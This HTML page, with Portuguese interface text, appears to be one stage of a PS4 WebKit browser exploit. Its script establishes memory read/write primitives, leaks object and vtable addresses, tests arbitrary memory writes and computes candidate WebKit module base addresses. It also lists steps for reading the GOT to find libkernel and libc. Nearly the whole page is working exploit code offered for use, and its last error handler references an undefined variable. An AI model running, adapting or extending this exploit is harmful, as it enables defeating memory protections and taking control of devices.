
<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>PS4 WebKit — Safe Info Gather</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  html, body {
    height: 100%;
    background: #0b0f19;
    color: #c8ced8;
    font: 14px/1.5 "Segoe UI", system-ui, sans-serif;
    display: flex; flex-direction: column;
    align-items: center;
    justify-content: flex-start;
    gap: 14px;
    padding: 20px;
  }
  h1 { color: #fff; font-size: 22px; letter-spacing: 0.5px; }
  #status {
    font-size: 20px; font-weight: 700; color: #fff;
    min-height: 1.5em;
    text-align: center;
  }
  #log {
    width: 95%; max-width: 900px; height: 520px;
    background: #111827; border: 1px solid #1f2937;
    border-radius: 10px; padding: 14px 16px;
    overflow-y: auto; font-family: ui-monospace, SFMono-Regular, monospace;
    font-size: 12px; color: #9fb1c3;
    white-space: pre-wrap; word-break: break-all;
    box-shadow: inset 0 2px 8px rgba(0,0,0,0.4);
  }
  #log .ok { color: #4ade80; }
  #log .err { color: #f87171; }
  #log .info { color: #60a5fa; }
  #log .warn { color: #fbbf24; }
  #actions {
    display: flex; gap: 12px; flex-wrap: wrap;
    justify-content: center;
  }
  button {
    padding: 12px 28px; border: 1px solid rgba(255,255,255,0.18);
    border-radius: 12px; color: #fff;
    background: linear-gradient(135deg, #3b82f6, #1d4ed8);
    box-shadow: 0 8px 24px rgba(37,99,235,0.28);
    font: 700 15px/1 "Segoe UI", system-ui, sans-serif;
    cursor: pointer; transition: all .12s ease;
  }
  button:hover { transform: translateY(-2px); }
  button:active { transform: translateY(1px); }
  button:disabled {
    opacity: 0.45; cursor: not-allowed; transform: none;
    background: #374151; box-shadow: none;
  }
</style>
</head>
<body>

<h1>PS4 WebKit — Safe Info Gather</h1>
<div id="status">Inicializando...</div>
<div id="log"></div>
<div id="actions">
  <button id="btnGather" disabled>Coletar Dados</button>
  <button id="btnClear" onclick="clearLog()">Limpar Log</button>
</div>

<script type="module">
  import { establishPrimitive } from "./resources/core.js";
  import { installWindowP } from "./resources/mem.js";
  import { int64 } from "./resources/int64.js";

  const status = document.getElementById("status");
  const logBox = document.getElementById("log");
  const btnGather = document.getElementById("btnGather");

  function log(msg, cls = "info") {
    const line = document.createElement("div");
    line.className = cls;
    line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
    logBox.appendChild(line);
    logBox.scrollTop = logBox.scrollHeight;
  }

  window.clearLog = function() {
    logBox.innerHTML = "";
  };

  function onCoreEvent(tag, detail) {
    log(`${tag}: ${detail}`, "info");
  }

  function onMemEvent(tag, detail) {
    log(`${tag}: ${detail}`, "info");
  }

  // ========== SAFE GATHER (NO SCAN!) ==========
  window.gatherInfo = function() {
    const p = window.p;
    if (!p) { log("window.p não está disponível!", "err"); return; }
    log("=== COLETANDO DADOS (SEM SCAN) ===", "ok");

    try {
      // 1. User-Agent = firmware
      let ua = navigator.userAgent;
      log(`User-Agent: ${ua}`, "ok");

      // 2. __ps5NativeCtor (se o core.js exportou)
      let ctor = null;
      try {
        ctor = globalThis.__ps5NativeCtor;
        if (typeof ctor === "number" && ctor > 0) {
          log(`__ps5NativeCtor = 0x${ctor.toString(16)}`, "ok");
          log(`  -> Convertido: int64(0x${(ctor % 0x100000000).toString(16)}, 0x${Math.floor(ctor / 0x100000000).toString(16)})`, "info");
        } else {
          log("__ps5NativeCtor NÃO disponível (undefined ou zero)", "warn");
        }
      } catch (e) {
        log("__ps5NativeCtor não acessível", "err");
      }

      // 3. Vtable do textarea (endereço no heap)
      let textarea = document.createElement("textarea");
      let textAddr = p.leakval(textarea);
      let vtablePtr = p.read8(textAddr.add32(0x18));
      log(`textarea object @ 0x${textAddr.toString(16)}`, "ok");
      log(`vtable ptr (heap) @ 0x${vtablePtr.toString(16)}`, "ok");

      // 4. Primeiros 8 entries do vtable (todos em código do módulo)
      log("Vtable entries (8 primeiros):", "info");
      let entries = [];
      for (let i = 0; i < 8; i++) {
        let entry = p.read8(vtablePtr.add32(i * 8));
        entries.push(entry);
        log(`  [${i}] 0x${entry.toString(16)}`, "info");
      }

      // 5. Menor entry = mais próximo do início do módulo
      let minEntry = entries.reduce((a, b) => {
        if (a.hi < b.hi) return a;
        if (a.hi > b.hi) return b;
        return a.low < b.low ? a : b;
      });
      log(`Menor vtable entry: 0x${minEntry.toString(16)}`, "ok");

      // 6. Diferenças entre entries (para identificar o módulo)
      log("Deltas entre entries consecutivos:", "info");
      for (let i = 1; i < 8; i++) {
        let delta = entries[i].sub32(entries[i-1].low);
        // Handle underflow
        if (entries[i].hi < entries[i-1].hi || (entries[i].hi === entries[i-1].hi && entries[i].low < entries[i-1].low)) {
          log(`  [${i-1}] -> [${i}] : underflow (provavelmente entries em módulos diferentes)`, "warn");
        } else {
          log(`  [${i-1}] -> [${i}] : +0x${(entries[i].low - entries[i-1].low).toString(16)}`, "info");
        }
      }

      // 7. RW sanity
      let testBuf = new Uint8Array(8);
      let testAddr = p.leakval(testBuf);
      let original = p.read8(testAddr.add32(0x10));
      p.write8(testAddr.add32(0x10), new int64(0x41414141, 0x42424242));
      let modified = p.read8(testAddr.add32(0x10));
      p.write8(testAddr.add32(0x10), original);
      log(`RW test: 0x${original.toString(16)} -> 0x${modified.toString(16)}`, "ok");

      // 8. Instruções para o source code
      log("=== PRÓXIMOS PASSOS (com source code) ===", "warn");
      log("1. No source code do PS4 WebKit, procure por:", "warn");
      log("   - O símbolo do native constructor usado no exploit", "warn");
      log("   - Ou o vtable de HTMLTextAreaElement", "warn");
      log("2. Calcule o offset do símbolo em relação ao início do libSceWebKit2", "warn");
      log("3. Base = endereço_acima - offset", "warn");
      log("4. Com a base, leia a GOT para achar libkernel e libc", "warn");

      log("=== DADOS PARA CALIBRAÇÃO ===", "ok");
      log(`Firmware: ${ua.match(/PlayStation 4\/([\d.]+)/)?.[1] || "desconhecido"}`, "ok");
      if (ctor) log(`Native constructor: 0x${ctor.toString(16)}`, "ok");
      log(`Vtable ptr: 0x${vtablePtr.toString(16)}`, "ok");
      log(`Menor entry: 0x${minEntry.toString(16)}`, "ok");

      // 9. Tentar calcular base se tivermos __ps5NativeCtor e um offset chute
      //    (sem scan — só mostramos o cálculo)
      if (ctor) {
        let offsetsToTry = [0x12405d20, 0x12000000, 0x13000000, 0x14000000, 0x10000000];
        log("Bases candidatas (se __ps5NativeCtor estiver no WebKit):", "info");
        for (let off of offsetsToTry) {
          let base = new int64((ctor - off) % 0x100000000, Math.floor((ctor - off) / 0x100000000));
          let aligned = base.low & 0xFFFFC000;
          let baseAligned = new int64(aligned, base.hi);
          log(`  offset 0x${off.toString(16)} -> base ~ 0x${baseAligned.toString(16)}`, "info");
        }
      }

    } catch (e) {
      log(`ERRO: ${e.name}: ${e.message}`, "err");
    }
  };

  btnGather.onclick = window.gatherInfo;

  // ========== BOOTSTRAP ==========
  log("Carregando módulos...", "ok");
  status.textContent = "Executando exploit...";

  establishPrimitive({ onEvent: onCoreEvent })
    .then(carrier => {
      log("Core: primitivo estabelecido", "ok");
      log(`Tentativas: ${carrier.attempts}`, "info");

      const prim = installWindowP(carrier, {
        onEvent: onMemEvent,
        promote: true
      });

      log("Mem: real pair ativo", "ok");
      log("window.p está disponível", "ok");

      window.__carrier = carrier;
      window.__prim = prim;
      window.int64 = int64;

      status.textContent = "RW Primitivo OK — Pronto";
      status.style.color = "#4ade80";
      btnGather.disabled = false;

      try {
        const testAddr = prim.leakval(prim);
        log(`Sanity leak(prim) = 0x${testAddr.toString(16)}`, "ok");
      } catch (e) {
        log(`Sanity leak falhou: ${e.message}`, "err");
      }
    })
    .catch(err => {
      log(`FALHA: ${err.name}: ${e.message}`, "err");
      status.textContent = "Falha no exploit";
      status.style.color = "#f87171";
    });
</script>

</body>
</html>
